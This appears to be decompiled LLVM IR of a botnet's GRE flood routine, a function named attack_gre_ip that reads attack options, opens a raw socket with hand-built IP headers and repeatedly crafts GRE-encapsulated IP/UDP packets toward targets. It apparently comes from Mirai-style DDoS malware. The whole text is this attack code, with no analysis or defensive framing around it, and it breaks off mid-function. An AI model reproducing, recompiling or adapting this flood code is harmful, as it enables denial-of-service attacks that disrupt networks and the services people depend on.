define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_ad34 = load i32, i32* @r4, align 4
  %v24_ad34 = load i32, i32* @fp, align 4
  %v27_ad34 = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_ad60 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ad64 = load i32, i32* @r4, align 4
  store i32 %v0_ad64, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ad70 = load i32, i32* @sb, align 4
  store i32 %v0_ad70, i32* %r3.global-to-local, align 4
  %v0_ad74 = load i32, i32* @r5, align 4
  %v5_ad78 = inttoptr i32 %v0_ad64 to i32*
  %v6_ad78 = call i32 @attack_get_opt_int(i32 %v0_ad74, i32* %v5_ad78, i32 2, i32 %v0_ad70)
  %v1_ad84 = urem i32 %v6_ad78, 256
  store i32 %v1_ad84, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ad90 = load i32, i32* @r4, align 4
  store i32 %v0_ad90, i32* %r1.global-to-local, align 4
  %v0_ad94 = load i32, i32* @r5, align 4
  %v5_ad98 = trunc i32 %v6_ad78 to i8
  %v6_ad9c = inttoptr i32 %v0_ad90 to i32*
  %v7_ad9c = call i32 @attack_get_opt_int(i32 %v0_ad94, i32* %v6_ad9c, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_ada0 = load i32, i32* @r4, align 4
  store i32 %v0_ada0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_adb0 = load i32, i32* @r5, align 4
  %v5_adb4 = inttoptr i32 %v0_ada0 to i32*
  %v6_adb4 = call i32 @attack_get_opt_int(i32 %v0_adb0, i32* %v5_adb4, i32 4, i32 64)
  %v1_adbc = urem i32 %v6_adb4, 256
  store i32 %v1_adbc, i32* %ip.global-to-local, align 4
  %v0_adc0 = load i32, i32* @r4, align 4
  store i32 %v0_adc0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  %v6_add4 = inttoptr i32 %v0_adc0 to i32*
  %v7_add4 = call i32 @attack_get_opt_int(i32 %v0_adcc, i32* %v6_add4, i32 5, i32 1)
  %v1_ade0 = urem i32 %v7_add4, 256
  store i32 %v1_ade0, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_adec = load i32, i32* @r4, align 4
  store i32 %v0_adec, i32* %r1.global-to-local, align 4
  %v0_adf0 = load i32, i32* @r5, align 4
  %v5_adf8 = inttoptr i32 %v0_adec to i32*
  %v6_adf8 = call i32 @attack_get_opt_int(i32 %v0_adf0, i32* %v5_adf8, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_ae00 = load i32, i32* @r4, align 4
  store i32 %v0_ae00, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_adf8, i32* %fp.global-to-local, align 4
  %v0_ae10 = load i32, i32* @r5, align 4
  %v4_ae14 = inttoptr i32 %v0_ae00 to i32*
  %v5_ae14 = call i32 @attack_get_opt_int(i32 %v0_ae10, i32* %v4_ae14, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_ae18 = load i32, i32* @r4, align 4
  store i32 %v0_ae18, i32* %r1.global-to-local, align 4
  %v0_ae1c = load i32, i32* @sb, align 4
  store i32 %v0_ae1c, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_ae14, i32* @r8, align 4
  %v0_ae28 = load i32, i32* @r5, align 4
  %v4_ae2c = inttoptr i32 %v0_ae18 to i32*
  %v5_ae2c = call i32 @attack_get_opt_int(i32 %v0_ae28, i32* %v4_ae2c, i32 %v0_ae1c, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ae3c = load i32, i32* @r4, align 4
  store i32 %v0_ae3c, i32* %r1.global-to-local, align 4
  %v0_ae40 = load i32, i32* @r5, align 4
  %v4_ae44 = inttoptr i32 %v0_ae3c to i32*
  %v5_ae44 = call i32 @attack_get_opt_int(i32 %v0_ae40, i32* %v4_ae44, i32 1, i32 1)
  %v1_ae4c = urem i32 %v5_ae44, 256
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v0_ae50 = load i32, i32* @r4, align 4
  store i32 %v0_ae50, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_ae58 = load i32, i32* @sb, align 4
  store i32 %v0_ae58, i32* %r3.global-to-local, align 4
  %v0_ae5c = load i32, i32* @r5, align 4
  %v5_ae64 = inttoptr i32 %v0_ae50 to i32*
  %v6_ae64 = call i32 @attack_get_opt_int(i32 %v0_ae5c, i32* %v5_ae64, i32 18, i32 %v0_ae58)
  %v0_ae6c = load i32, i32* @r4, align 4
  store i32 %v0_ae6c, i32* %r1.global-to-local, align 4
  %v2_ae70 = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_ae70, i32* %r3.global-to-local, align 4
  store i32 %v6_ae64, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_ae7c = load i32, i32* @r5, align 4
  %v4_ae80 = inttoptr i32 %v0_ae6c to i32*
  %v5_ae80 = call i32 @attack_get_opt_int(i32 %v0_ae7c, i32* %v4_ae80, i32 24, i32 %v2_ae70)
  %v0_ae88 = load i32, i32* @sb, align 4
  %v1_ae8c = inttoptr i32 %v0_ae88 to i32*
  %v2_ae8c = call i32 @__GI_time(i32* %v1_ae8c)
  %v1_ae90 = load i32, i32* @r6, align 4
  %v2_ae90 = add i32 %v1_ae90, %v2_ae8c
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_aea4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_aea8 = icmp eq i32 %v3_aea4, -1
  store i1 %v7_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aea8, label %dec_label_pc_b378, label %dec_label_pc_aeb4

dec_label_pc_aeb4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aebc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aebc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_aec4 = load i32, i32* @sb, align 4
  store i32 %v0_aec4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aed0 = call i32 @__GI_setsockopt(i32 %v3_aea4, i32 %v0_aec4, i32 3, i32 %v6_aebc, i32 4)
  %v7_aed4 = icmp eq i32 %v5_aed0, -1
  store i1 %v7_aed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aed4, label %dec_label_pc_b384, label %dec_label_pc_aedc

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aeb4
  %v0_aedc = load i32, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_aef0 = load i32, i32* @r8, align 4
  %v3_aef4 = mul i32 %v7_ad9c, 65536
  store i32 %v3_aef4, i32* %r1.global-to-local, align 4
  %v0_aef8 = load i32, i32* @r7, align 4
  %v1_aef8 = urem i32 %v0_aef8, 256
  store i32 %v1_aef8, i32* @r7, align 4
  %v3_aefc = urem i32 %v0_aedc, 65536
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v3_af00 = urem i32 %v0_aef0, 65536
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v2_af04 = icmp eq i32 %arg2, 0
  store i1 %v2_af04, i1* %cpsr_z.global-to-local, align 1
  %v0_af14 = load i32, i32* @sb, align 4
  store i32 %v0_af14, i32* %stack_var_-44, align 4
  %v3_af18 = urem i32 %v7_ad9c, 65536
  store i32 %v3_af18, i32* @fp, align 4
  br i1 %v2_af04, label %dec_label_pc_b10c.preheader, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_aedc
  %v3_aef0 = mul i32 %v0_aef0, 65536
  %v3_aedc = mul i32 %v0_aedc, 65536
  %v3_af2c = mul i32 %v5_ae2c, 65536
  %v1_af30 = add i32 %v3_af2c, 3407872
  %tmp68 = udiv i32 %v1_af30, 256
  %v3_af3c = and i32 %tmp68, 65280
  %v7_ad9c.not = or i32 %v7_ad9c, -65536
  %v1_af40 = xor i32 %v7_ad9c.not, 65535
  %v4_af44 = udiv i32 %v1_af30, 16777216
  %v5_af44 = or i32 %v3_af3c, %v4_af44
  store i32 %v3_aef4, i32* %r3.global-to-local, align 4
  %tmp69 = mul i32 %v7_ad9c, 256
  %v3_af5c = and i32 %tmp69, 65280
  %tmp70 = mul nsw i32 %v1_af40, 256
  %v3_af60 = and i32 %tmp70, 65280
  %tmp71 = udiv i32 %v7_ad9c, 256
  %v4_af64 = urem i32 %tmp71, 256
  %v5_af64 = or i32 %v4_af64, %v3_af5c
  %tmp72 = udiv i32 %v1_af40, 256
  %v4_af6c = urem i32 %tmp72, 256
  %v5_af6c = or i32 %v4_af6c, %v3_af60
  store i32 %v5_af6c, i32* @r6, align 4
  store i32 %v3_aedc, i32* %r1.global-to-local, align 4
  store i32 %v3_aef0, i32* %r2.global-to-local, align 4
  %v1_af80 = add i32 %v3_af2c, 524288
  %tmp73 = mul i32 %v0_aedc, 256
  %v3_af84 = and i32 %tmp73, 65280
  %v1_af88 = add i32 %v3_af2c, 1835008
  store i32 %v1_af88, i32* @r5, align 4
  %tmp74 = mul i32 %v0_aef0, 256
  %v3_af8c = and i32 %tmp74, 65280
  %v3_af94 = udiv i32 %v1_af88, 256
  %tmp75 = udiv i32 %v0_aedc, 256
  %v4_af98 = urem i32 %tmp75, 256
  %v5_af98 = or i32 %v4_af98, %v3_af84
  %tmp76 = udiv i32 %v0_aef0, 256
  %v4_af9c = urem i32 %tmp76, 256
  %v5_af9c = or i32 %v4_af9c, %v3_af8c
  store i32 %v5_af9c, i32* %ip.global-to-local, align 4
  %v1_afa0 = and i32 %v3_af94, 65280
  %tmp77 = udiv i32 %v1_af80, 256
  %v3_afa4 = and i32 %tmp77, 65280
  store i32 %v3_afa4, i32* @lr, align 4
  %v4_afb8 = udiv i32 %v1_af80, 16777216
  %v5_afb8 = or i32 %v3_afa4, %v4_afb8
  store i32 %v5_afb8, i32* @r7, align 4
  %v4_afbc = udiv i32 %v1_af88, 16777216
  %v5_afbc = or i32 %v1_afa0, %v4_afbc
  store i32 %v5_afbc, i32* @r8, align 4
  store i32 %v0_af14, i32* @r4, align 4
  %v4_b014 = sext i8 %v5_ad98 to i32
  %v1_b020 = trunc i32 %v6_adb4 to i8
  %sext = mul nuw i32 %v5_af44, 65536
  %v4_b028 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_af64, 65536
  %v4_b02c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_af6c, 65536
  %v4_b094 = sdiv i32 %sext9, 65536
  %v2_b0c4 = icmp eq i32 %v1_aef8, 0
  %sext10 = mul nuw i32 %v5_af98, 65536
  %v4_b0e8 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_af9c, 65536
  %v4_b0f0 = sdiv i32 %sext11, 65536
  %extract.t = trunc i32 %v4_b028 to i16
  br label %dec_label_pc_afc4

dec_label_pc_afc4:                                ; preds = %bb82, %dec_label_pc_af28
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_afd0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_ad60, i32* %ip.global-to-local, align 4
  %v2_afdc = load i32, i32* @r4, align 4
  %v5_afdc = mul i32 %v2_afdc, 4
  %v6_afdc = add i32 %v5_afdc, %v2_ad60
  %v7_afdc = inttoptr i32 %v6_afdc to i32*
  store i32 %v2_afd0, i32* %v7_afdc, align 4
  %v3_afe0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afe0, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* %ip.global-to-local, align 4
  %v4_afe4 = mul i32 %v3_afe0, 4
  %v5_afe4 = add i32 %v0_afe4, %v4_afe4
  %v6_afe4 = inttoptr i32 %v5_afe4 to i32*
  %v7_afe4 = load i32, i32* %v6_afe4, align 4
  store i32 %v7_afe4, i32* %r4.global-to-local, align 4
  %v1_afe8 = inttoptr i32 %v7_afe4 to i8*
  %v2_afe8 = load i8, i8* %v1_afe8, align 1
  %tmp = urem i8 %v2_afe8, 16
  %v1_afec = zext i8 %tmp to i32
  %v1_aff0 = or i32 %v1_afec, 64
  store i32 %v1_aff0, i32* %r2.global-to-local, align 4
  %v1_aff4 = trunc i32 %v1_aff0 to i8
  store i8 %v1_aff4, i8* %v1_afe8, align 1
  %v0_aff8 = load i32, i32* %r3.global-to-local, align 4
  %v5_affc = mul i32 %v0_aff8, 24
  store i32 %v5_affc, i32* %r1.global-to-local, align 4
  %v0_b000 = load i32, i32* %r4.global-to-local, align 4
  %v1_b000 = inttoptr i32 %v0_b000 to i8*
  %v2_b000 = load i8, i8* %v1_b000, align 1
  %v1_b004 = and i8 %v2_b000, -16
  %v1_b008 = or i8 %v1_b004, 5
  store i32 %v1_ade0, i32* %lr.global-to-local, align 4
  store i8 %v1_b008, i8* %v1_b000, align 1
  store i32 %v4_b014, i32* %r2.global-to-local, align 4
  %v2_b018 = load i32, i32* %r4.global-to-local, align 4
  %v3_b018 = add i32 %v2_b018, 1
  %v4_b018 = inttoptr i32 %v3_b018 to i8*
  store i8 %v5_ad98, i8* %v4_b018, align 1
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v2_b020 = load i32, i32* %r4.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 8
  %v4_b020 = inttoptr i32 %v3_b020 to i8*
  store i8 %v1_b020, i8* %v4_b020, align 1
  %v0_b024 = load i32, i32* %lr.global-to-local, align 4
  %v2_b024 = icmp eq i32 %v0_b024, 0
  store i1 %v2_b024, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b028, i32* %ip.global-to-local, align 4
  store i32 %v4_b02c, i32* %lr.global-to-local, align 4
  br i1 %v2_b024, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_afc4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b034 = load i32, i32* %r4.global-to-local, align 4
  %v4_b034 = add i32 %v3_b034, 6
  %v5_b034 = inttoptr i32 %v4_b034 to i16*
  store i16 64, i16* %v5_b034, align 2
  %v0_b038.pre = load i32, i32* %ip.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_b038.pre to i16
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_afc4, %bb
  %v0_b038.off0 = phi i16 [ %extract.t, %dec_label_pc_afc4 ], [ %extract.t27, %bb ]
  %v2_b038 = load i32, i32* %r4.global-to-local, align 4
  %v3_b038 = add i32 %v2_b038, 2
  %v4_b038 = inttoptr i32 %v3_b038 to i16*
  store i16 %v0_b038.off0, i16* %v4_b038, align 2
  %v0_b03c = load i32, i32* %r4.global-to-local, align 4
  %v1_b03c = add i32 %v0_b03c, 20
  store i32 %v1_b03c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v3_b048 = add i32 %v0_b03c, 9
  %v4_b048 = inttoptr i32 %v3_b048 to i8*
  store i8 47, i8* %v4_b048, align 1
  %v0_b04c = load i32, i32* %lr.global-to-local, align 4
  %v1_b04c = trunc i32 %v0_b04c to i16
  %v2_b04c = load i32, i32* %r4.global-to-local, align 4
  %v3_b04c = add i32 %v2_b04c, 4
  %v4_b04c = inttoptr i32 %v3_b04c to i16*
  store i16 %v1_b04c, i16* %v4_b04c, align 2
  %v0_b050 = load i32, i32* %ip.global-to-local, align 4
  %v1_b050 = trunc i32 %v0_b050 to i16
  %v2_b050 = load i32, i32* %r2.global-to-local, align 4
  %v3_b050 = add i32 %v2_b050, 2
  %v4_b050 = inttoptr i32 %v3_b050 to i16*
  store i16 %v1_b050, i16* %v4_b050, align 2
  store i32 %v5_ae80, i32* %lr.global-to-local, align 4
  %v0_b058 = load i32, i32* %r4.global-to-local, align 4
  %v1_b058 = add i32 %v0_b058, 24
  %v2_b058 = inttoptr i32 %v1_b058 to i8*
  %v3_b058 = load i8, i8* %v2_b058, align 1
  %v4_b058 = zext i8 %v3_b058 to i32
  store i32 %v4_b058, i32* %r2.global-to-local, align 4
  %v2_b05c = add i32 %v0_b058, 12
  %v3_b05c = inttoptr i32 %v2_b05c to i32*
  store i32 %v5_ae80, i32* %v3_b05c, align 4
  %v0_b060 = load i32, i32* %r2.global-to-local, align 4
  %v1_b060 = and i32 %v0_b060, -241
  %v1_b064 = or i32 %v1_b060, 64
  store i32 %v1_b064, i32* %r2.global-to-local, align 4
  %v0_b068 = load i32, i32* %r1.global-to-local, align 4
  %v1_b068 = load i32, i32* @sl, align 4
  %v2_b068 = add i32 %v1_b068, %v0_b068
  store i32 %v2_b068, i32* %r1.global-to-local, align 4
  %v1_b06c = add i32 %v2_b068, 16
  %v2_b06c = inttoptr i32 %v1_b06c to i32*
  %v3_b06c = load i32, i32* %v2_b06c, align 4
  store i32 %v3_b06c, i32* %r1.global-to-local, align 4
  %v1_b070 = trunc i32 %v1_b064 to i8
  %v2_b070 = load i32, i32* %r4.global-to-local, align 4
  %v3_b070 = add i32 %v2_b070, 24
  %v4_b070 = inttoptr i32 %v3_b070 to i8*
  store i8 %v1_b070, i8* %v4_b070, align 1
  %v0_b074 = load i32, i32* %r4.global-to-local, align 4
  %v1_b074 = add i32 %v0_b074, 24
  %v2_b074 = inttoptr i32 %v1_b074 to i8*
  %v3_b074 = load i8, i8* %v2_b074, align 1
  %v1_b078 = and i8 %v3_b074, -16
  %v1_b07c = or i8 %v1_b078, 5
  store i8 %v1_b07c, i8* %v2_b074, align 1
  %v0_b084 = load i32, i32* %r1.global-to-local, align 4
  %v1_b084 = load i32, i32* %r4.global-to-local, align 4
  %v2_b084 = add i32 %v1_b084, 16
  %v3_b084 = inttoptr i32 %v2_b084 to i32*
  store i32 %v0_b084, i32* %v3_b084, align 4
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  %v0_b08c = load i32, i32* %r4.global-to-local, align 4
  %v1_b08c = add i32 %v0_b08c, 24
  store i32 %v1_b08c, i32* @r5, align 4
  %v3_b090 = add i32 %v0_b08c, 25
  %v4_b090 = inttoptr i32 %v3_b090 to i8*
  store i8 %v5_ad98, i8* %v4_b090, align 1
  store i32 %v4_b094, i32* %r2.global-to-local, align 4
  %v0_b098 = load i32, i32* @r8, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r5, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  %v0_b09c = load i32, i32* %r2.global-to-local, align 4
  %v1_b09c = trunc i32 %v0_b09c to i16
  %v2_b09c = load i32, i32* @r5, align 4
  %v3_b09c = add i32 %v2_b09c, 4
  %v4_b09c = inttoptr i32 %v3_b09c to i16*
  store i16 %v1_b09c, i16* %v4_b09c, align 2
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0a4, label %bb79, label %bb78

bb78:                                             ; preds = %.thread
  store i32 64, i32* %ip.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %.thread, %bb78
  %v2_b0a8 = load i32, i32* @r5, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 8
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b020, i8* %v4_b0a8, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b0b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0b0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_b0b0 = load i32, i32* %ip.global-to-local, align 4
  %v2_b0b0 = trunc i32 %v1_b0b0 to i16
  %v3_b0b0 = load i32, i32* @r5, align 4
  %v4_b0b0 = add i32 %v3_b0b0, 6
  %v5_b0b0 = inttoptr i32 %v4_b0b0 to i16*
  store i16 %v2_b0b0, i16* %v5_b0b0, align 2
  %v0_b0b4.pre = load i32, i32* %r3.global-to-local, align 4
  %extract.t28 = trunc i32 %v0_b0b4.pre to i8
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_b0b4.off0 = phi i8 [ 17, %bb79 ], [ %extract.t28, %bb80 ]
  %v2_b0b4 = load i32, i32* @r5, align 4
  %v3_b0b4 = add i32 %v2_b0b4, 9
  %v4_b0b4 = inttoptr i32 %v3_b0b4 to i8*
  store i8 %v0_b0b4.off0, i8* %v4_b0b4, align 1
  %v0_b0b8 = call i32 @rand_next()
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b0c4, i1* %cpsr_z.global-to-local, align 1
  %v1_b0c8 = sub i32 1023, %v0_b0b8
  store i32 %v1_b0c8, i32* %r3.global-to-local, align 4
  br i1 %v2_b0c4, label %.thread12, label %.thread13

.thread12:                                        ; preds = %bb81
  %v2_b0d0 = load i32, i32* @r5, align 4
  %v3_b0d0 = add i32 %v2_b0d0, 16
  %v4_b0d0 = inttoptr i32 %v3_b0d0 to i32*
  store i32 %v1_b0c8, i32* %v4_b0d0, align 4
  br label %bb82

.thread13:                                        ; preds = %bb81
  %v1_b0cc = load i32, i32* %r4.global-to-local, align 4
  %v2_b0cc = add i32 %v1_b0cc, 16
  %v3_b0cc = inttoptr i32 %v2_b0cc to i32*
  %v4_b0cc = load i32, i32* %v3_b0cc, align 4
  store i32 %v4_b0cc, i32* %r3.global-to-local, align 4
  %v2_b0d4 = load i32, i32* @r5, align 4
  %v3_b0d4 = add i32 %v2_b0d4, 16
  %v4_b0d4 = inttoptr i32 %v3_b0d4 to i32*
  store i32 %v4_b0cc, i32* %v4_b0d4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread12, %.thread13
  %v1_b0d8 = load i32, i32* @r5, align 4
  %v2_b0d8 = add i32 %v1_b0d8, 12
  %v3_b0d8 = inttoptr i32 %v2_b0d8 to i32*
  store i32 %v0_b0b8, i32* %v3_b0d8, align 4
  %v3_b0dc = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_b0e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b0e4 = add i32 %v0_b0e4, 44
  store i32 %v1_b0e4, i32* @r6, align 4
  store i32 %v4_b0e8, i32* %r2.global-to-local, align 4
  %v1_b0ec = add i32 %v3_b0dc, 1
  store i32 %v1_b0ec, i32* @r4, align 4
  store i32 %v4_b0f0, i32* %r3.global-to-local, align 4
  %v9_b0f4 = icmp eq i32 %v1_b0ec, %arg2
  store i1 %v9_b0f4, i1* %cpsr_z.global-to-local, align 1
  %v0_b0f8 = load i32, i32* @r7, align 4
  %v1_b0f8 = trunc i32 %v0_b0f8 to i16
  %v3_b0f8 = add i32 %v0_b0e4, 48
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i16*
  store i16 %v1_b0f8, i16* %v4_b0f8, align 2
  %v0_b0fc = load i32, i32* %r2.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r6, align 4
  %v3_b0fc = inttoptr i32 %v2_b0fc to i16*
  store i16 %v1_b0fc, i16* %v3_b0fc, align 2
  %v0_b100 = load i32, i32* %r3.global-to-local, align 4
  %v1_b100 = trunc i32 %v0_b100 to i16
  %v2_b100 = load i32, i32* @r6, align 4
  %v3_b100 = add i32 %v2_b100, 2
  %v4_b100 = inttoptr i32 %v3_b100 to i16*
  store i16 %v1_b100, i16* %v4_b100, align 2
  %v0_b104 = load i32, i32* @r4, align 4
  store i32 %v0_b104, i32* %stack_var_-44, align 4
  %v5_b108 = icmp slt i32 %v1_b0ec, %arg2
  br i1 %v5_b108, label %dec_label_pc_afc4, label %dec_label_pc_b10c.preheader

dec_label_pc_b10c.preheader:                      ; preds = %bb82, %dec_label_pc_aedc
  %v1_b128 = add i32 %v5_ae2c, 8
  %v1_b12c = add i32 %v5_ae2c, 52
  %v2_b138 = icmp eq i32 %v5_ae80, -1
  %v7_b138 = icmp eq i32 %v5_ae80, -1
  %v2_b31c = icmp eq i32 %v1_aef8, 0
  %v2_b338 = icmp eq i32 %v1_ae4c, 0
  br label %dec_label_pc_b10c

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b10c.preheader, %dec_label_pc_b364
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_af04, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_af04, label %dec_label_pc_b364, label %dec_label_pc_b120

dec_label_pc_b120:                                ; preds = %dec_label_pc_b10c
  store i32 %v5_ae2c, i32* %lr.global-to-local, align 4
  store i32 %v1_b128, i32* @sb, align 4
  store i32 %v1_b12c, i32* @r8, align 4
  br label %dec_label_pc_b238

dec_label_pc_b134:                                ; preds = %dec_label_pc_b238
  store i32 %v5_ae80, i32* %r2.global-to-local, align 4
  store i1 %v7_b138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b138, label %dec_label_pc_b2c0, label %dec_label_pc_b140

dec_label_pc_b140:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b134
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  %v0_b148 = load i32, i32* @fp, align 4
  %v9_b148 = icmp eq i32 %v0_b148, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  store i1 %v9_b148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b148, label %dec_label_pc_b2d8, label %dec_label_pc_b150

dec_label_pc_b150:                                ; preds = %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge, %dec_label_pc_b140
  %v1_b154 = phi i32 [ %v1_b154.pre, %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), %dec_label_pc_b140 ]
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v9_b154 = icmp eq i32 %v3_aefc, %v1_b154
  store i1 %v9_b154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b154, label %dec_label_pc_b300, label %dec_label_pc_b15c

dec_label_pc_b15c:                                ; preds = %dec_label_pc_b2d8, %dec_label_pc_b150
  %v1_b160 = phi i32 [ %v1_b2f8, %dec_label_pc_b2d8 ], [ %v1_b154, %dec_label_pc_b150 ]
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v9_b160 = icmp eq i32 %v3_af00, %v1_b160
  store i1 %v9_b160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b160, label %dec_label_pc_b314, label %dec_label_pc_b168

dec_label_pc_b168:                                ; preds = %dec_label_pc_b300, %dec_label_pc_b15c
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b31c, label %dec_label_pc_b330, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_b168
  %v1_b170 = load i32, i32* @r5, align 4
  %v2_b170 = add i32 %v1_b170, 16
  %v3_b170 = inttoptr i32 %v2_b170 to i32*
  %v4_b170 = load i32, i32* %v3_b170, align 4
  store i32 %v4_b170, i32* %r3.global-to-local, align 4
  %v2_b174 = load i32, i32* @r6, align 4
  %v3_b174 = add i32 %v2_b174, 16
  %v4_b174 = inttoptr i32 %v3_b174 to i32*
  store i32 %v4_b170, i32* %v4_b174, align 4
  br label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %bb83, %.thread14
  store i32 %v1_ae4c, i32* %r1.global-to-local, align 4
  store i1 %v2_b338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b338, label %dec_label_pc_b188, label %dec_label_pc_b344

dec_label_pc_b188:                                ; preds = %dec_label_pc_b17c, %dec_label_pc_b330, %dec_label_pc_b344
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b18c = load i32, i32* @r5, align 4
  %v3_b18c = add i32 %v2_b18c, 10
  %v4_b18c = inttoptr i32 %v3_b18c to i16*
